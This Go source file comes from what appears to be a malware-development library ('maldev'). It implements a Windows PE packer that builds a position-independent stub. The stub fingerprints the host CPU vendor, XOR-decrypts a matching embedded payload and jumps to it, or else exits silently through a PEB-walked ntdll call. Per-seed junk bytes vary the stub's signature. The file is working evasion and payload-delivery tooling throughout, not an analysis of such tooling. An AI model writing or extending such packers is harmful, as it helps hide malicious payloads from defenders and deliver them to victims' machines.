package packer

import (
	"encoding/binary"
	"fmt"
	mathrand "math/rand"

	"github.com/oioio-space/maldev/pe/packer/stubgen/amd64"
	"github.com/oioio-space/maldev/pe/packer/stubgen/stage1"
	"github.com/oioio-space/maldev/pe/packer/transform"
	"github.com/oioio-space/maldev/random"
)

// Windows symmetry of [WrapBundleAsExecutableLinux]. PHASE A shipped
// 2026-05-10.
//
// **Runtime status**: byte-shape pinned via unit tests
// (TestWrapBundleAsExecutableWindows_*). Windows VM E2E
// TestWrapBundleAsExecutableWindows_E2E_RunsExit42Windows reports
// ACCESS_VIOLATION (0xc0000005) — the wrapped PE crashes before
// reaching the matched payload. Diagnosis requires routing the stub
// bytes through the asmtrace VEH harness (mmap + VEH) for the
// register dump; the kernel-loaded PE path opaques the crash.
// QUEUED for supervised debug. The Linux variant
// [WrapBundleAsExecutableLinux] remains GREEN and is unaffected.
//
// What this PHASE delivers:
//
//   - Same scan stub as the Linux variant (PIC + CPUID prologue +
//     12-byte vendor compare loop) — copies bytes verbatim from
//     [bundleStubVendorAware] for the prefix and the matched-tail
//     decrypt+JMP sections.
//   - The .no_match block swaps Linux's 9-byte sys_exit_group(0)
//     for a 5-byte `jmp rel32` to the §2 EmitNtdllRtlExitUserProcess
//     primitive (143 B) appended at the stub's end.
//   - Wraps via [transform.BuildMinimalPE32Plus] producing a
//     runnable PE32+.
//
// PHASE B (queued, blocked on PHASE A runtime green):
//
//   - PT_WIN_BUILD predicate wired in (PEB.OSBuildNumber read +
//     range check).
//   - Per-build ImageBase derivation from `profile.Vaddr` (currently
//     ignored on Windows; canonical 0x140000000 used).

// bundleStubVendorAwareWindows returns the Windows-flavoured scan
// stub. Internal layout:
//
//	[0..114]   shared with Linux: PIC + CPUID prologue + loop body
//	[115..119] jmp rel32 → .§2_block at end of stub
//	[120..N]   matched-tail (verbatim from Linux: 19 B body +
//	           53 B decrypt+JMP = 72 B)
//	[N..]      §2 EmitNtdllRtlExitUserProcess(0) — 143 B
//
// The .matched section moved from Linux offset 124 to Windows offset
// 120 (4-byte left shift because the new fallback is 5 B vs 9 B).
// Three Jcc displacements that target .matched have their disp byte
// patched -4 to compensate.
//
// Returns the stub bytes plus an error if the §2 primitive failed
// to assemble (impossible for the fixed exit-code-0 input but
// surfaces cleanly).
func bundleStubVendorAwareWindows() ([]byte, error) {
	linux := bundleStubVendorAware()
	if len(linux) < 124 {
		return nil, fmt.Errorf("packer: linux stub %d bytes < 124 (matched-section anchor)", len(linux))
	}

	// Assemble the §2 ExitProcess block via the public API.
	b, err := amd64.New()
	if err != nil {
		return nil, fmt.Errorf("packer: amd64 builder: %w", err)
	}
	if err := stage1.EmitNtdllRtlExitUserProcess(b, 0); err != nil {
		return nil, fmt.Errorf("packer: emit ExitProcess: %w", err)
	}
	exitBlock, err := b.Encode()
	if err != nil {
		return nil, fmt.Errorf("packer: encode ExitProcess: %w", err)
	}

	matchedTail := linux[124:]
	matchedLen := uint32(len(matchedTail))

	out := make([]byte, 0, 115+5+len(matchedTail)+len(exitBlock))
	out = append(out, linux[:115]...)
	// jmp rel32 → §2 block.
	// End-of-jmp is at offset 120; §2 starts at 120 + matchedLen.
	// Disp = matchedLen.
	jmpDisp := make([]byte, 4)
	binary.LittleEndian.PutUint32(jmpDisp, matchedLen)
	out = append(out, 0xe9)
	out = append(out, jmpDisp...)
	out = append(out, matchedTail...)
	out = append(out, exitBlock...)

	// Patch the three Jcc displacements that target .matched
	// (originally 0x3c / 0x23 / 0x11 in the Linux stub at offsets
	// 63, 88, 106). .matched moved 4 bytes earlier in the Windows
	// stub, so each disp -= 4. Use direct subtraction so a future
	// Linux-stub edit that shifts these constants surfaces here as
	// a compile-time-detectable test failure.
	for _, dispOffset := range []int{63, 88, 106} {
		out[dispOffset] -= 4
	}

	return out, nil
}

// WrapBundleAsExecutableWindows composes a runnable Windows x86-64
// PE32+ from a bundle blob. Mirror of [WrapBundleAsExecutableLinux].
//
// Shipped PHASE A: scan stub matches PT_MATCH_ALL or PT_CPUID_VENDOR;
// PT_WIN_BUILD entries currently fall through (queued for PHASE B).
// On no match, calls ntdll!RtlExitUserProcess(0) via the §2 PEB-walk
// primitive — silent clean exit, equivalent to BundleFallbackExit.
func WrapBundleAsExecutableWindows(bundle []byte) ([]byte, error) {
	return WrapBundleAsExecutableWindowsWith(bundle, BundleProfile{})
}

// WrapBundleAsExecutableWindowsWith is the per-build-profile-aware
// variant. Validates the bundle's magic against profile.Magic
// (canonical default when zero) before wrapping.
//
// Per-build ImageBase derivation from profile.Vaddr is queued for
// PHASE B — today the canonical [transform.MinimalPE32PlusImageBase]
// (0x140000000) is used regardless of profile contents.
func WrapBundleAsExecutableWindowsWith(bundle []byte, profile BundleProfile) ([]byte, error) {
	seed, err := random.Int64()
	if err != nil {
		return nil, fmt.Errorf("packer: stub junk seed: %w", err)
	}
	return WrapBundleAsExecutableWindowsWithSeed(bundle, profile, seed)
}

// WrapBundleAsExecutableWindowsWithSeed is the deterministic variant.
// Same seed → same stub junk pattern → byte-identical wrapped output
// (modulo the random per-payload XOR keys from the upstream bundle
// pack). Use seed=0 for the canonical junk-free shape.
func WrapBundleAsExecutableWindowsWithSeed(bundle []byte, profile BundleProfile, seed int64) ([]byte, error) {
	if len(bundle) < BundleHeaderSize {
		return nil, fmt.Errorf("%w: %d < BundleHeaderSize %d",
			ErrBundleTruncated, len(bundle), BundleHeaderSize)
	}
	expected := resolvedMagic(profile)
	if magic := binary.LittleEndian.Uint32(bundle[0:4]); magic != expected {
		return nil, fmt.Errorf("%w: %#x != %#x",
			ErrBundleBadMagic, magic, expected)
	}

	stub, err := bundleStubVendorAwareWindows()
	if err != nil {
		return nil, err
	}
	if seed != 0 {
		rng := mathrand.New(mathrand.NewSource(seed))
		stub = injectStubJunk(stub, rng)
	}
	bundleOff := uint32(len(stub)) - 5 // distance from .pic label
	binary.LittleEndian.PutUint32(stub[bundleOffsetImm32Pos:], bundleOff)

	combined := make([]byte, 0, len(stub)+len(bundle))
	combined = append(combined, stub...)
	combined = append(combined, bundle...)

	// PHASE A: canonical ImageBase. PHASE B will derive from profile.Vaddr.
	return transform.BuildMinimalPE32Plus(combined)
}
